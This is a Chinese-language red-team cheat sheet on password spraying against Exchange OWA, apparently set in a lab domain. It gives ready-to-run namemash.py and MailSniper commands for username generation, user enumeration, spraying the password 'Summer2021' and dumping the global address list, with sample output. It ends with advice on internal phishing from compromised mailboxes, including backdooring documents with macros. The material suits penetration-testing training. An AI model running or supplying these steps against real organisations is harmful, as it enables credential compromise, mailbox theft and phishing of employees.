# 密码喷洒（Password Spraying）

3个工具:

## [namemash.py](https://gist.github.com/superkojiman/11076951)
一个根据完整用户名名单得到用户名各种组合的python工具
```
/opt/namemash.py names.txt >> possible-usernames.txt
```


## [MailSniper](https://github.com/dafthack/MailSniper)

引入
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

枚举NetBIOS name
```
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
```

验证哪些名字是域里的有效用户名
```
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
```

对上面的有效用户名进行密码喷洒,密码：```Summer2021```
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
```

注意：在现实渗透中，过多的喷洒尝试可能会暴露自己，以及导致用户被锁


使用MailSniper 下载全局地址列表
```
PS C:\> Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...
[*] This method requires PowerShell Version 3.0
[*] Using https://10.10.15.100/owa/auth.owa
[*] Logging into OWA...
[*] OWA Login appears to be successful.
[*] Retrieving OWA Canary...
[*] Successfully retrieved the X-OWA-CANARY cookie: ahhlRb0kZUKEg8YEo5ZZtQDYwqU8EdkIl7OJ7_ugwGfk56YCYe0ilgE2GKVxCNJTMpqknR3QJ_M.
[*] Retrieving AddressListId from GetPeopleFilters URL.
[*] Global Address List Id of b4477ba8-52b0-48bf-915e-d179db98788b was found.
[*] Now utilizing FindPeople to retrieve Global Address List
[*] Now cleaning up the list...
bfarmer@cyberbotic.io
iyates@cyberbotic.io
jadams@cyberbotic.io
jking@cyberbotic.io
nglover@cyberbotic.io
[*] A total of 5 email addresses were retrieved
[*] Email addresses have been written to gal.txt
```


## [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)


# 内部网络钓鱼

> 访问一个或多个内部邮箱开辟了一些可能性。我们可以搜索可能包含文档、用户名和密码等敏感信息的电子邮件；甚至代表受感染用户向员工发送电子邮件。我们可以发送我们自己制作的文件和/或链接，或者甚至下载已经在收件箱中的文档，将其后门（例如使用宏），然后将其发回给某人